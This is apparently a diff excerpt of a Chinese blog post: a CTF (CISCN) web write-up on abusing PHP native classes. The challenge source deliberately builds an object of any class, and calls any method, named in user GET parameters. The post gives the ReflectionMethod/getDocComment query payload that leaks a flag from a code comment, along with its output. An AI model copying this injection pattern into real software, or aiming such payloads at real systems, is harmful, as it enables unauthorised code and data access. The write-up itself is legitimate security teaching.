-</div><div class=assets><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.0/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/fuse.js@6.4.6/dist/fuse.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/topbar@1.0.1/topbar.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/@sliphua/pjax@2.4.0/dist/pjax.min.js></script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-176925141-1',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=UA-176925141-1" async></script><script>var _hmt=_hmt||[];(function(){var a=document.createElement("script"),b;a.src="https://hm.baidu.com/hm.js?3b1ab845351bb3a8ee808b639bca6ce5",b=document.getElementsByTagName("script")[0],b.parentNode.insertBefore(a,b)})()</script></div>
-<div class=pjax-assets><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{valine:{appId:"shaenDlkzwy9NvdCNJVrJspu-MdYXbMMI",appKey:"e074xMKoSw3B9kWmBediaBE9",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/",emojiMaps:{"2233_卖萌":"2233/卖萌n.png","2233_吃惊":"2233/吃惊n.png","2233_吐魂":"2233/吐魂.png","2233_喝水":"2233/喝水.png","2233_困惑":"2233/困惑n.png","2233_大哭":"2233/大哭.png","2233_大笑":"2233/大笑n.png","2233_委屈":"2233/委屈.png","2233_怒":"2233/怒.png","2233_无言":"2233/无言.png","2233_汗":"2233/汗n.png","2233_疑问":"2233/疑问n.png","2233_第一":"2233/第一.png","2233_耶":"2233/耶.png","2233_郁闷":"2233/郁闷.png",tv_doge:"xiaodianshi/doge.gif","tv_亲亲":"xiaodianshi/亲亲.gif","tv_偷笑":"xiaodianshi/偷笑.gif","tv_再见":"xiaodianshi/再见.gif","tv_发怒":"xiaodianshi/发怒.gif","tv_发财":"xiaodianshi/发财.gif","tv_可爱":"xiaodianshi/可爱.gif","tv_吐血":"xiaodianshi/吐血.gif","tv_呆":"xiaodianshi/呆.gif","tv_呕吐":"xiaodianshi/呕吐.gif","tv_困":"xiaodianshi/困.gif","tv_坏笑":"xiaodianshi/坏笑.gif","tv_大佬":"xiaodianshi/大佬.gif","tv_大哭":"xiaodianshi/大哭.gif","tv_委屈":"xiaodianshi/委屈.gif","tv_害羞":"xiaodianshi/害羞.gif","tv_尴尬":"xiaodianshi/尴尬.gif","tv_微笑":"xiaodianshi/微笑.gif","tv_思考":"xiaodianshi/思考.gif","tv_打脸":"xiaodianshi/打脸.gif","tv_抓狂":"xiaodianshi/抓狂.gif","tv_抠鼻子":"xiaodianshi/抠鼻子.gif","tv_斜眼笑":"xiaodianshi/斜眼笑.gif","tv_晕":"xiaodianshi/晕.gif","tv_流汗":"xiaodianshi/流汗.gif","tv_流鼻血":"xiaodianshi/流鼻血.gif","tv_点赞":"xiaodianshi/点赞.gif","tv_生气":"xiaodianshi/生气.gif","tv_生病":"xiaodianshi/生病.gif","tv_疑问":"xiaodianshi/疑问.gif","tv_白眼":"xiaodianshi/白眼.gif","tv_睡着":"xiaodianshi/睡着.gif","tv_笑哭":"xiaodianshi/笑哭.gif","tv_腼腆":"xiaodianshi/腼腆.gif","tv_色":"xiaodianshi/色.gif","tv_调皮":"xiaodianshi/调皮.gif","tv_鄙视":"xiaodianshi/鄙视.gif","tv_闭嘴":"xiaodianshi/闭嘴.gif","tv_难过":"xiaodianshi/难过.gif","tv_馋":"xiaodianshi/馋.gif","tv_黑人问号":"xiaodianshi/黑人问号.gif","tv_鼓掌":"xiaodianshi/鼓掌.gif","蛆音娘_OK":"quyinniang/OK.png","蛆音娘_die":"quyinniang/die.png","蛆音娘_偷看":"quyinniang/偷看.png","蛆音娘_卖萌":"quyinniang/卖萌.png","蛆音娘_吃惊":"quyinniang/吃惊q.png","蛆音娘_吃瓜群众":"quyinniang/吃瓜群众.png","蛆音娘_吐血":"quyinniang/吐血.png","蛆音娘_哭泣":"quyinniang/哭泣q.png","蛆音娘_哼":"quyinniang/哼.png","蛆音娘_大笑":"quyinniang/大笑.png","蛆音娘_害怕":"quyinniang/害怕.png","蛆音娘_扶额":"quyinniang/扶额.png","蛆音娘_摇头":"quyinniang/摇头.png","蛆音娘_无语":"quyinniang/无语q.png","蛆音娘_机智":"quyinniang/机智.png","蛆音娘_滑稽":"quyinniang/滑稽.png","蛆音娘_生气":"quyinniang/生气.png","蛆音娘_疑问":"quyinniang/疑问.png","蛆音娘_睡觉觉":"quyinniang/睡觉觉.png","蛆音娘_肥皂":"quyinniang/肥皂.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:5,placeholder:"Just go go",recordIP:!0,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},search:{distance:100,findAllMatches:!1,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,type:"fuse",useExtendedSearch:!1},twemoji:!0}</script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.4.16/dist/Valine.min.js defer></script><script type=text/javascript src=/js/valine.min.js defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/twemoji@13.1.0/dist/twemoji.min.js defer></script><script type=text/javascript src=/js/twemoji.min.js defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js></script><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css></div>
-</body>
-</html>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？
+</span></span><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>class User
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>    private static $c = 0;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function a()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function b()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function c()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function d()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function e()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function f()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function g()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function h()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function i()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function j()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function k()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function l()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function m()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function n()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function o()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function p()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function q()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function r()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function s()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function t()
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        return ++self::$c;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$rc=$_GET[&#34;rc&#34;];
+</span></span><span class=line><span class=cl>$rb=$_GET[&#34;rb&#34;];
+</span></span><span class=line><span class=cl>$ra=$_GET[&#34;ra&#34;];
+</span></span><span class=line><span class=cl>$rd=$_GET[&#34;rd&#34;];
+</span></span><span class=line><span class=cl>$method= new $rc($ra, $rb);
+</span></span><span class=line><span class=cl>var_dump($method-&gt;$rd());
+</span></span></code></pre></td></tr></table></div></div><p>看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个<code>$ra</code>、<code>$rb</code></p><p>，源码虽然给出了<code>User</code>类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。</p><p>根据提示</p><blockquote><p>虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</p></blockquote><p>应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个<code>ReflectionMethod</code>类，并且<code>ReflectionMethod</code>类中刚好有一个<code>getDocComment</code> 方法可以获得注释：</p><blockquote><p>简介：<strong>ReflectionMethod</strong> 类报告了一个方法的有关信息。类报告了一个方法的有关信息</p><p>ReflectionFunctionAbstract::getDocComment — 获取注释内容</p></blockquote><p>源码中初始化创建对象为<code>new $rc($ra, $rb)</code>，传递了两个参数，<code>ReflectionMethod</code>类的初始化魔术方法也提供了两个参数</p><blockquote><p>public ReflectionMethod::__construct ( <a href=https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed target=_blank rel="noopener noreffer">mixed</a> <code>$class</code> , string <code>$name</code> )</p></blockquote><p>所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释</p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment
+</span></span></code></pre></td></tr></table></div></div><p>结果</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>你能发现我吗string(152) &#34;/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */&#34;
+</span></span></code></pre></td></tr></table></div></div><p>题外话：在尝试过程中还发现了另一个类<code>ReflectionClass</code></p><blockquote><p>简介：<strong>ReflectionClass</strong> 类报告了一个类的有关信息。</p></blockquote><p>和上面的那个类对比，两个类研究的对象不一样<strong>ReflectionMethod</strong>研究的是类中的方法，<strong>ReflectionClass</strong> 研究的是类。</p><p>这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2021-08-18</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/web/>Web</a>,&nbsp;<a href=/tags/sql%E6%B3%A8%E5%85%A5/>sql注入</a>,&nbsp;<a href=/tags/php%E5%8E%9F%E7%94%9F%E7%B1%BB/>php原生类</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/readlezphpeasysearch/ class=prev rel=prev title=ReadlezPHP&EasySearch><i class="fas fa-angle-left fa-fw"></i>ReadlezPHP&EasySearch</a>
+<a href=/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/ class=next rel=next title=博客搬迁>博客搬迁<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.96.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href=https://github.com/HEIGE-PCloud/DoIt target=_blank rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer">Braindance</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.0/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/fuse.js@6.4.6/dist/fuse.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/topbar@1.0.1/topbar.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/@sliphua/pjax@2.4.0/dist/pjax.min.js></script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-176925141-1",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=UA-176925141-1" async></script><script>var _hmt=_hmt||[];(function(){var e=document.createElement("script"),t;e.src="https://hm.baidu.com/hm.js?3b1ab845351bb3a8ee808b639bca6ce5",t=document.getElementsByTagName("script")[0],t.parentNode.insertBefore(e,t)})()</script></div><div class=pjax-assets><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{valine:{appId:"shaenDlkzwy9NvdCNJVrJspu-MdYXbMMI",appKey:"e074xMKoSw3B9kWmBediaBE9",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/",emojiMaps:{"2233_卖萌":"2233/卖萌n.png","2233_吃惊":"2233/吃惊n.png","2233_吐魂":"2233/吐魂.png","2233_喝水":"2233/喝水.png","2233_困惑":"2233/困惑n.png","2233_大哭":"2233/大哭.png","2233_大笑":"2233/大笑n.png","2233_委屈":"2233/委屈.png","2233_怒":"2233/怒.png","2233_无言":"2233/无言.png","2233_汗":"2233/汗n.png","2233_疑问":"2233/疑问n.png","2233_第一":"2233/第一.png","2233_耶":"2233/耶.png","2233_郁闷":"2233/郁闷.png",tv_doge:"xiaodianshi/doge.gif","tv_亲亲":"xiaodianshi/亲亲.gif","tv_偷笑":"xiaodianshi/偷笑.gif","tv_再见":"xiaodianshi/再见.gif","tv_发怒":"xiaodianshi/发怒.gif","tv_发财":"xiaodianshi/发财.gif","tv_可爱":"xiaodianshi/可爱.gif","tv_吐血":"xiaodianshi/吐血.gif","tv_呆":"xiaodianshi/呆.gif","tv_呕吐":"xiaodianshi/呕吐.gif","tv_困":"xiaodianshi/困.gif","tv_坏笑":"xiaodianshi/坏笑.gif","tv_大佬":"xiaodianshi/大佬.gif","tv_大哭":"xiaodianshi/大哭.gif","tv_委屈":"xiaodianshi/委屈.gif","tv_害羞":"xiaodianshi/害羞.gif","tv_尴尬":"xiaodianshi/尴尬.gif","tv_微笑":"xiaodianshi/微笑.gif","tv_思考":"xiaodianshi/思考.gif","tv_打脸":"xiaodianshi/打脸.gif","tv_抓狂":"xiaodianshi/抓狂.gif","tv_抠鼻子":"xiaodianshi/抠鼻子.gif","tv_斜眼笑":"xiaodianshi/斜眼笑.gif","tv_晕":"xiaodianshi/晕.gif","tv_流汗":"xiaodianshi/流汗.gif","tv_流鼻血":"xiaodianshi/流鼻血.gif","tv_点赞":"xiaodianshi/点赞.gif","tv_生气":"xiaodianshi/生气.gif","tv_生病":"xiaodianshi/生病.gif","tv_疑问":"xiaodianshi/疑问.gif","tv_白眼":"xiaodianshi/白眼.gif","tv_睡着":"xiaodianshi/睡着.gif","tv_笑哭":"xiaodianshi/笑哭.gif","tv_腼腆":"xiaodianshi/腼腆.gif","tv_色":"xiaodianshi/色.gif","tv_调皮":"xiaodianshi/调皮.gif","tv_鄙视":"xiaodianshi/鄙视.gif","tv_闭嘴":"xiaodianshi/闭嘴.gif","tv_难过":"xiaodianshi/难过.gif","tv_馋":"xiaodianshi/馋.gif","tv_黑人问号":"xiaodianshi/黑人问号.gif","tv_鼓掌":"xiaodianshi/鼓掌.gif","蛆音娘_OK":"quyinniang/OK.png","蛆音娘_die":"quyinniang/die.png","蛆音娘_偷看":"quyinniang/偷看.png","蛆音娘_卖萌":"quyinniang/卖萌.png","蛆音娘_吃惊":"quyinniang/吃惊q.png","蛆音娘_吃瓜群众":"quyinniang/吃瓜群众.png","蛆音娘_吐血":"quyinniang/吐血.png","蛆音娘_哭泣":"quyinniang/哭泣q.png","蛆音娘_哼":"quyinniang/哼.png","蛆音娘_大笑":"quyinniang/大笑.png","蛆音娘_害怕":"quyinniang/害怕.png","蛆音娘_扶额":"quyinniang/扶额.png","蛆音娘_摇头":"quyinniang/摇头.png","蛆音娘_无语":"quyinniang/无语q.png","蛆音娘_机智":"quyinniang/机智.png","蛆音娘_滑稽":"quyinniang/滑稽.png","蛆音娘_生气":"quyinniang/生气.png","蛆音娘_疑问":"quyinniang/疑问.png","蛆音娘_睡觉觉":"quyinniang/睡觉觉.png","蛆音娘_肥皂":"quyinniang/肥皂.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:5,placeholder:"Just go go",recordIP:!0,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},search:{distance:100,findAllMatches:!1,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,type:"fuse",useExtendedSearch:!1},twemoji:!0}</script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.4.16/dist/Valine.min.js defer></script><script type=text/javascript src=/js/valine.min.js defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/twemoji@13.1.0/dist/twemoji.min.js defer></script><script type=text/javascript src=/js/twemoji.min.js defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js></script><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css></div></body></html>
